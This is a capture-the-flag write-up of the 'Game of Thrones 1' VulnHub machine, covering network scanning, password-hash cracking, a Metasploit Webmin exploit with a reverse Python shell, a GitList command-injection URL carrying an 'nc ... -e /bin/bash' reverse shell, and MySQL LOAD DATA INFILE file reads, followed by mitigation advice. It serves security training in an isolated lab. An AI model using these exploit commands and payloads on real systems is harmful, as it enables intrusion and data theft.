# CTF Challenge: Game of Thrones 1

## Introduction and Objectives

Capture The Flag (CTF) challenges are educational security simulations where practitioners test their penetration testing skills by identifying and exploiting vulnerabilities within a target system. The ultimate goal is to capture hidden text files known as flags.
This report documents the security assessment of the vulnerable virtual machine *Game of Thrones (GOT) 1* that includes 7 main flags and 4 extra ones. For the purpose of this demo I focused exclusively on the 7 main flags.

## Lab Setup
The testing environment was virtualized and isolated using Oracle VirtualBox. It consists of two virtual machines:
- Attacker Machine: Kali Linux (provisioned with specific utilities including mcrypt for decryption and knock for port-knocking maneuvers).
- Target Machine: Game of Thrones 1 (configured according to the author's specifications: 1 vCPU and 1512 MB of RAM).

Both machines were configured on the same local network using Bridge Mode.

## Threat Model
The threat model defined for this assessment assumes the following threat actor capabilities:
- The attacker is located within the same local network segment (LAN) as the target.
- The attacker can initially communicate with publicly exposed services .

The ultimate objective is achieving full system compromise (root privileges) and exfiltrating all 7 main flags.

## Attack and Kingdom Compromise Walkthrough
### Initial Reconnaissance and Network Scanning
To map the network and discover the target, I first verified my Kali Linux local IP address using the `ip a` command, identifying it as `192.168.1.58/24`. Next, I performed a ping scan across the subnet to locate active hosts: `sudo nmap -sn 192.168.1.0/24`.
The scan successfully isolated the target's IP address: 192.168.1.124. I then launched a comprehensive, aggressive Nmap scan targeting all TCP ports to enumerate active services, version banners, and potential vulnerabilities via default scripts: `sudo nmap -p- -sV -sC -A 192.168.1.124`.
The resulting output revealed a broad attack surface, exposing FTP, SSH, HTTP, IMAP, MySQL, and PostgreSQL services.

I initiated my analysis from the HTTP service (port 80). Navigating to the IP via a web browser showed only the CTF rules within the HTML source code. To discover hidden directories, I performed a directory brute-force attack using dirb: `dirb http://192.168.1.124/`.

Among the findings, I inspected the `robots.txt` file that highlighted three paths: `/secret-island/`, `/direct-access-to-kings-landing/`, and `/the-tree/`. The latter implemented a restriction based on the User-Agent string, granting access exclusively to the Three-eyed-raven browser identity.

By browsing to `/secret-island/`, I uncovered a link to a CTF map that mapped each kingdom to a specific network service:
- Dorne: FTP
- The Wall & The North: HTTP
- Iron Island: DNS
- Mountain and the Vale: PostgreSQL
- The Reach: IMAP
- The Rock and King’s Landing: GitList and MySQL

Visiting `/direct-access-to-kings-landing/` yielded no immediate results.

To bypass the User-Agent restriction on `/the-tree/`, I modified Firefox's advanced configuration by accessing `about:config`. I added a string parameter named `general.useragent.override` and set its value to Three-eyed-raven. By inspecting the source code of the page I harvested the username for the Dorne kingdom. Finally, by checking the path `/h/i/d/d/e/n/index.php`, discovered during brute-forcing, I successfully retrieved the corresponding password.

### Dorne (FTP)

Leveraging the credentials exfiltrated during the web reconnaissance phase, I initiated an FTP session: `ftp 192.168.1.124`.
Upon successful authentication, I retrieved the first flag. I then listed the remote directory contents using `ls`, revealing two files: `problems_in_the_north.txt` and `the_wall.txt.nc`. I downloaded both locally using the `get` command.

Inspecting `problems_in_the_north.txt` via `cat` revealed a hashed credential format indicating a nested, salted hashing scheme: `md5(md5($s).$p)`. I saved the hash into a text file and utilized John the Ripper, specifying the exact matching cryptographic format (dynamic_2008):  
```bash
echo 'nobody:6000e084bf18c302eae4559d48cb520c$2hY68a' > hash.txt
john --format=dynamic_2008 hash.txt
```

The tool successfully cracked the hash, returning the plaintext password: stark.

The second file, `the_wall.txt.nc`, was encrypted using the Advanced Encryption Standard (AES/Rijndael) block cipher. Employing the `mcrypt` utility and providing the freshly cracked password as the decryption key, I unlocked the file:
```bash
mcrypt -d the_wall.txt.nc
cat the_wall.txt
```
The decrypted file provided explicit credentials and setup instructions for the next phase.

### The Wall and The North (HTTP)

I navigated to http://winterfell.7kingdoms.ctf/——W1nt3rf3ll—— , but the browser failed to resolve the domain name. This setup leverages Virtual Hosting, a mechanism where a web server hosts multiple domain names on a single IP address, routing traffic based on the HTTP Host header sent by the client.

To simulate proper DNS resolution within my isolated lab environment, I appended a static mapping (`192.168.1.124 winterfell.7kingdoms.ctf`) to the Kali Linux local hosts file: `sudo vim /etc/hosts`

Refreshing the browser opened the login portal. After authenticating with the previously acquired credentials, I inspected the page source code to extract the second flag alongside a new cryptographic clue.

### Iron Island (DNS)

The clue hinted at exploring "the magic on the shield." I downloaded the image asset (`stark_shield.jpeg`) and extracted readable ASCII strings using `strings stark_shield.jpeg`.

Within the output, I spotted a clear reference pointing to a DNS TXT record for the domain `Timef0rconqu3rs.7Kingdoms.ctf`. DNS TXT records are typically used to hold arbitrary text strings. I queried the target's active DNS server directly:
`nslookup -type=TXT Timef0rconqu3rs.7Kingdoms.ctf 192.168.1.124`. The DNS server's response revealed the third flag and a new set of credentials (aryastark) designated for a service running on port 10000.

### Stormlands (Webmin)

By insoecting http://192.168.1.124:10000, I reached the login interface of the Webmin systems management panel. Logging in, I identified the software version as 1.590.

I cross-referenced this version against known public vulnerabilities using searchsploit: `searchsploit webmin`. The search identified a well-known Remote Code Execution vulnerability tracked as CVE-2012-2982. The flaw exists within the `show.cgi`component due to insufficient input validation, allowing an authenticated user to inject and execute arbitrary system commands with application privileges.

To automate execution, I launched Metasploit (`msfconsole`), selected the appropriate exploit module, and configured the required session variables, including the remote target, credentials and a Python-based reverse shell payload to call back to my attacker machine:
```bash
use exploit/unix/webapp/webmin_show_cgi_exec
set USERNAME aryastark
set PASSWORD N3ddl3_1s_a_g00d_sword#!
set RHOSTS 192.168.1.124
set LHOST 192.168.1.58
set SSL false
set PAYLOAD cmd/unix/reverse_python
exploit
```

The exploit executed successfully, spawning an interactive reverse shell. I traversed the file system to the user's home directory and exfiltrated the fourth flag: 
```bash
cd /home/aryastark
cat flag.txt
```
The file also revealed the connection parameters for a backend PostgreSQL database.

### Mountain and the Vale (PostgreSQL)

Using the established shell, I connected to the target's PostgreSQL database service using the native psql client: `psql -h 192.168.1.124 -d mountainandthevale -U robinarryn`.

Once the SQL interactive session was established, I listed the available tables using the `\d` meta-command and queried the contents of the flag table: `\d+ flag`. The retrieved output was obfuscated using Base64 encoding, identifiable by its alphanumeric character set and the trailing == padding characters. 

I exited the SQL client and decoded the string via the Kali Linux CLI:
```bash
echo 'TmljZSEgeW91IGNvbnF1ZXJlZCB0aGUgS2luZ2RvbSBvZiB0aGUgTW91bnRhaW4gYW5kIHRoZSBWYWxlLiBUaGlzIGlzIHlvdXIgZmxhZzogYmIzYWVjMGZkY2RiYzI5NzQ4OTBmODA1YzU4NWQ0MzIuIE5leHQgc3RvcCB0aGUgS2luZ2RvbSBvZiB0aGUgUmVhY2guIFlvdSBjYW4gaWRlbnRpZnkgeW91cnNlbGYgd2l0aCB0aGlzIHVzZXIvcGFzcyBjb21iaW5hdGlvbjogb2xlbm5hdHlyZWxsQDdraW5nZG9tcy5jdGYvSDFnaC5HYXJkM24ucG93YWggLCBidXQgZmlyc3QgeW91IG11c3QgYmUgYWJsZSB0byBvcGVuIHRoZSBnYXRlcw==' | base64 -d
```
The decoded text revealed the fifth flag along with IMAP credentials for olennatyrell and a cryptic instruction regarding "opening the gates."

### The Reach (IMAP)

According to my initial Nmap scan, the IMAP service (port 143) was marked as Filtered, indicating that an host-based firewall was blocking inbound traffic. The previous clue hinted at "opening the gates", implying a Port-Knocking defense mechanism. This technique keeps a port closed until the client sends a precise sequence of connection attempts to specific closed ports, dynamically updating firewall rules to allow access from the attacker's IP.

Utilizing the port sequence recovered from earlier clues (3487, 64535, 12345), I executed the knock sequence: `knock -v 192.168.1.124 3487 64535 12345`. A subsequent port scan confirmed that port 143 had transitioned to the Open state. I then established a text-based interactive session with the IMAP service using telnet: `telnet 192.168.1.124 143`.

I authenticated according to IMAP protocol syntax, listed the mailboxes, and selected the inbox folder to fetch the unread email body:
```imap
. LOGIN olennatyrell@7kingdoms.ctf H1gh.Gard3n.powah
. LIST "" "*"
. SELECT INBOX
. FETCH 1 BODY[]
```
The raw email output exposed the sixth flag and the web panel credentials for the final phase.

### The Rock and King’s Landing (GitList and MySQL)

I authenticated to the GitList web application running on port 1337 (http://192.168.1.124:1337). Exploring the Casterly-Rock repository, I discovered a Markdown file named `note_under_the_bad.md` containing a long hexadecimal string. I converted the hex string back to plaintext ASCII using xxd:
```bash
echo '2f686f6d652f747972696f6e6c616e6e69737465722f636865636b706f696e742e747874' | xxd -r -plain
```
The output revealed a local file path: `/home/tyrionlannister/checkpoint.txt`.

Next, I used searchsploit to look up GitList vulnerabilities, finding a critical Remote Code Execution exploit tracked as CVE-2014-4511. This flaw stems from a total lack of input sanitization within the URL string passed to the Git sub-commands. By injecting command escape sequences, such as backticks (`) or double quotes encoded as URL hex (%22%22%60), the web server executes arbitrary operating system commands with web-user privileges.

I configured a Netcat listener on my Kali machine to catch the inbound reverse connection: `nc -nvlp 5555`.
I then issued the payload-laden HTTP request, injecting a Netcat reverse shell string directly into the vulnerable URL structure:
`http://192.168.1.124:1337/casterly-rock/blob/master/%22%22%60nc 192.168.1.58 5555 -e /bin/bash%60`.
The server instantly executed the payload, yielding a reverse shell. I navigated to Tyrion's home folder and read the `checkpoint.txt` file to gather final database credentials.

The King's Landing required interaction with the local MySQL database. Using the credentials extracted from the checkpoint file, I logged into the database engine directly from the compromised shell environment: `mysql -h 127.0.0.1 -u cerseilannister -p_g0dsHaveNoMercy_ -D kingslanding`.

I listed the tables and discovered a table named `iron_throne`. Running a `SELECT *` query on it returned an obfuscated message written in Morse Code. Translating it using an external web utility pointed to an unconventional system file path: `/etc/mysql/flag`.

To read this root-protected file, I audited my database user privileges using: `SHOW GRANTS FOR CURRENT_USER;`.
The output showed that cerseilannister possessed `SELECT`, `INSERT`, and `CREATE` privileges, inherently inheriting the powerful `FILE` privilege. 

To read the flag file, I abused the `LOAD DATA INFILE` SQL command, forcing the database engine to read the root-owned system file and import its raw text contents into a newly created temporary staging table:
```bash
CREATE TABLE temporary_flag (content VARCHAR(500));
LOAD DATA INFILE '/etc/mysql/flag' INTO TABLE temporary_flag;
SELECT * FROM temporary_flag;
```
The database executed the query, revealing the seventh and final flag, completing the comprehensive compromise of the target machine.

## Mitigation Recommendations
To remediate the vulnerabilities exploited throughout this kill chain, the system administrator should implement the following security hardening procedures:
- Strict Patch Management: Immediately update Webmin and GitList instances to their latest stable releases to permanently eliminate the remote code execution flaws (CVE-2012-2982 and CVE-2014-4511).
- Principle of Least Privilege (Database Hardening): Revoke the FILE privilege from non-administrative database users like cerseilannister. Additionally, configure the global secure_file_priv variable in my.cnf to restrict import/export tasks to a specific, isolated folder, completely neutralizing the LOAD DATA INFILE file system attack vectors.
- Modern, Strong Hashing Functions: Upgrade credential storage from legacy MD5 algorithms to contemporary, slow password-hashing schemes designed to resist hardware-accelerated (GPU) cracking attempts, such as bcrypt, Argon2, or PBKDF2.

## Resources and References
Hacking Articles: <https://www.hackingarticles.in/hack-game-thrones-vm-ctf-challenge/>

Other Technical References: 	<https://thehackingquest.net/ctf-game-of-thrones-parte-i/>

								<https://thehackingquest.net/ctf-game-of-thrones-parte-ii/>

								<https://thehackingquest.net/ctf-game-of-thrones-parte-iii/>

								<https://thehackingquest.net/ctf-game-of-thrones-parte-iv/>

								<https://thehackingquest.net/ctf-game-of-thrones-parte-v/>


Target Download Repository: <https://www.vulnhub.com/entry/game-of-thrones-ctf-1,201/> 

Vulnerability Scoring Reference: <https://nvd.nist.gov/>


